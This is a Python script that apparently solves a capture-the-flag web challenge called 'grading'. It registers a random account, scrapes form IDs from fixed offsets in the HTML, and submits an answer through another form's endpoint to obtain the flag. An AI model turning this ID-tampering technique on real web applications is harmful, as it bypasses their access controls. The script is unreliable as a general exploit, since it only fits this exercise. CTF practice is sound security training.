from requests import get,post,session
import random,string

# target = "http://localhost:3000"
target = "https://grading.hsc.tf"
s = session()
rand = lambda : ''.join(random.choice(string.ascii_lowercase) for i in range(30))
username = rand()
passwd = rand()

r = s.post(f"{target}/register",data={"username":username,"password":passwd}).text

f1 = r[989:1013]
f2 = r[1119:1143]

r = s.get(f"{target}/{f1}").text
q1 = r[r.index('type="radio" name="')+19:r.index('type="radio" name="')+43]

s.post(f"{target}/{f2}",data={"ID":q1,"value":"Africa is not a country"})

r = s.get(f"{target}/{f1}").text
print(r[r.index("flag"):r.index("flag")+200])
